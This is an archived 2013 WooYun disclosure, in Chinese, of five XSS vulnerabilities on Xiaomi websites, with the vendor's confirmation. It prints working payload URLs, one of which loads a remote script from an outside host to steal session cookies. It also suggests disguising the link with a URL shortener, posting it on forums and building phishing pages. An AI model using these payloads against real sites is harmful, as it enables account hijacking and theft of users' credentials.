@@ -1,0 +1,229 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		小米5个XSS漏洞，可以盗取cookie并成功登录  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		小米5个XSS漏洞，可以盗取cookie并成功登录  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-09-05 17:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-26：	细节向普通白帽子公开<br/>
+									2013-10-06：	细节向实习白帽子公开<br/>
+									2013-10-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">3×5=15rank<br />
+xiaomi3 V5!<br />
+for F mark~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">一、小米手机台湾官网1个反射型XSS（http://tw.xiaomi.com域名）<br />
+<br />
+1 url：</p><pre><code>http://tw.xiaomi.com/accessories/all?adapt=&amp;page=1</code></pre><p class='detail'>中，其中参数page没有对xss代码进行过滤，导致可以XSS。<br />
+<br />
+构造后的利用URL：</p><pre><code>http://tw.xiaomi.com/accessories/all?adapt=&amp;page=1aaaaa%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/051730083fe687c8621916c7639fd8096f4fcee8.png" target="_blank"><img src="../images/051730083fe687c8621916c7639fd8096f4fcee8.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2 观察了一下发现，http://tw.xiaomi.com和www.xiaomi.com两个域名的登录是相通的，而且都没有http-only。所以用此反射型xss盗取了cookie后就可以直接登录用户的小米账户了（我自己用两个浏览器验证过）。<br />
+<br />
+构造插入任意外部js文件的url:</p><pre><code>http://tw.xiaomi.com/accessories/all?adapt=&amp;page=1aaaa%22%3E%3Cimg%20src=1%20onerror=%22with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&#039;//pxss.sinaapp.com/wCLExF&#039;%22%3E</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/05173039dc6e5cb5b3e2969b65b29064e971c1c3.png" target="_blank"><img src="../images/05173039dc6e5cb5b3e2969b65b29064e971c1c3.png" alt="22.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3 地址这么长，看起来都有点引起怀疑，用百度短地址（http://dwz.cn/）处理下。<br />
+<br />
+得到：http://dwz.cn/au0ND<br />
+<br />
+</p><p class="detail"><a href="../images/05173105cedc32e784494729f31c1d7a9da5e1b6.png" target="_blank"><img src="../images/05173105cedc32e784494729f31c1d7a9da5e1b6.png" alt="33.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4 上面的利用构造代码，只在IE下有用，在谷歌（包括谷歌内核浏览器，如360、猎豹等）浏览器下，会干掉onerror后面的东西，导致XSS失败。<br />
+<br />
+但是在谷歌下，我们可以通过谷歌浏览器特有的date协议来构造xss。<br />
+<br />
+</p><pre><code>url:http://tw.xiaomi.com/accessories/all?adapt=&amp;page=1aa&quot;&gt;&lt;script src=data:,alert(1)&lt;!--</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/051731398be2a50aade257de9a246803ac30f685.png" target="_blank"><img src="../images/051731398be2a50aade257de9a246803ac30f685.png" alt="44.png" width="600"/></a></p><p class="detail"><br />
+<br />
+哈哈，这样就可以通杀所有浏览器了！<br />
+<br />
+利用方法：发到社区论坛神马的地方，只要用户在点击的时候有登录www.xiaomi.com，那么账户cookie就会被盗，从而就可以登录用户小米账户。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+二、小米ROM下载频道4个DOM-XSS（http://rom.xiaomi.cn域名）<br />
+<br />
+1 首先对这个地址的四个参数进行输出观察，分别对每个参数进行标记。访问下面参数带有标记的地址：<br />
+<br />
+</p><pre><code>http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634aaaa&amp;hardwareVersionValue=88952634bbbb&amp;romTypeValue=88952634cccc&amp;softwareVersionValue=88952634dddd</code></pre><p class='detail'><br />
+<br />
+F12查找一下标记的参数，发现有输出在js代码中。<br />
+<br />
+</p><p class="detail"><a href="../images/05173204fe861211d13c63a4833691dfdb8b0603.png" target="_blank"><img src="../images/05173204fe861211d13c63a4833691dfdb8b0603.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2 试着去构造闭合一下，观察前后代码的环境，得出构造代码</p><pre><code>：)});alert(1);(function%20a(){//</code></pre><p class='detail'>带入到URL中，得到 </p><pre><code>http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634)});alert(1);(function%20a(){//&amp;hardwareVersionValue=88952634&amp;romTypeValue=88952634&amp;softwareVersionValue=88952634</code></pre><p class='detail'>访问一下，哈哈，弹窗了。很典型的一个DOM-XSS。<br />
+<br />
+</p><p class="detail"><a href="../images/05173236b256f3658f5141b512c19142489fec10.png" target="_blank"><img src="../images/05173236b256f3658f5141b512c19142489fec10.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3 下面F12看下，可以很直观的看到XSS的触发原理。<br />
+<br />
+</p><p class="detail"><a href="../images/05173252fc7c7085072233c28da6b3e8494f08df.png" target="_blank"><img src="../images/05173252fc7c7085072233c28da6b3e8494f08df.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4 其他三个参数的XSS构造方法同上，这里不在一一截图了。下面列出4个DOM-XSS<br />
+<br />
+</p><pre><code>http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634)});alert(1);(function%20a(){//&amp;hardwareVersionValue=88952634&amp;romTypeValue=88952634&amp;softwareVersionValue=88952634<br />
+http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&amp;hardwareVersionValue=88952634)});alert(2);(function%20a(){//&amp;romTypeValue=88952634&amp;softwareVersionValue=88952634<br />
+http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&amp;hardwareVersionValue=88952634&amp;romTypeValue=88952634)});alert(3);(function%20a(){//&amp;softwareVersionValue=88952634<br />
+http://rom.xiaomi.cn/list-169-1.html?mobileTypeValue=88952634&amp;hardwareVersionValue=88952634&amp;romTypeValue=88952634&amp;softwareVersionValue=88952634)});alert(4);(function%20a(){//</code></pre><p class='detail'> 利用：这个域名是有加http-only的，所以盗取到cookie是没多大用处的，但是可以写钓鱼页面之类的去骗用户的账户密码。也可以通过写入js发包请求来执行一些用户的操作，获取用户信息等。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">看上面。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1 对相关有XSS缺陷的参数的特殊字符进行过滤。<br />
+<br />
+2 上个漏洞是给我求小米3的F码，这个是给朋友求的。<br />
+<br />
+thanks for read~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036200" title="小米5个XSS漏洞，可以盗取cookie并成功登录">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：9 </p>
+													<p class="detail">确认时间：2013-09-06 10:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注小米安全。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36200";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
